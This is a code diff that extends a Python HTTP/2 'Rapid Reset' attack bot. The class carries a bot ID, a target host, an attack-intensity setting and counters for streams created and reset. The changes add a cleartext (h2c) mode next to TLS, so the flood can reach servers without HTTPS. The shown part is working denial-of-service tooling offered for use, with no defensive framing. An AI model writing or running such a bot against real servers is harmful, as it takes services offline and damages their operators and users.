@@ -9,11 +9,13 @@ import json
 import random
 
 class RapidResetBot:
-    def __init__(self, bot_id, target_host, target_port=443, attack_intensity="medium"):
+    def __init__(self, bot_id, target_host, target_port=443, attack_intensity="medium", use_tls=True):
         self.bot_id = bot_id
         self.target_host = target_host
         self.target_port = target_port
         self.attack_intensity = attack_intensity
+        self.use_tls = use_tls
+        self.scheme = 'https' if self.use_tls else 'http'
         self.running = False
         self.streams_created = 0
         self.streams_reset = 0
@@ -34,15 +36,16 @@ class RapidResetBot:
         self.logger.addHandler(handler)
     
     async def create_connection(self):
-        """Create HTTP/2 connection"""
+        """Create HTTP/2 connection. If use_tls is False, attempt cleartext (h2c prior knowledge)."""
         try:
             # Create TCP connection
             sock = socket.create_connection((self.target_host, self.target_port))
             
-            # Wrap with SSL
-            context = ssl.create_default_context()
-            context.set_alpn_protocols(['h2'])
-            sock = context.wrap_socket(sock, server_hostname=self.target_host)
+            # Optionally wrap with SSL for TLS/ALPN negotiation
+            if self.use_tls:
+                context = ssl.create_default_context()
+                context.set_alpn_protocols(['h2'])
+                sock = context.wrap_socket(sock, server_hostname=self.target_host)
             
             # Create HTTP/2 connection
             config = h2.config.H2Configuration(client_side=True)
@@ -75,7 +78,7 @@ class RapidResetBot:
                 headers = [
                     (':method', 'GET'),
                     (':path', f'/attack-target-{i}'),
-                    (':scheme', 'https'),
+                    (':scheme', self.scheme),
                     (':authority', self.target_host),
                 ]
                 
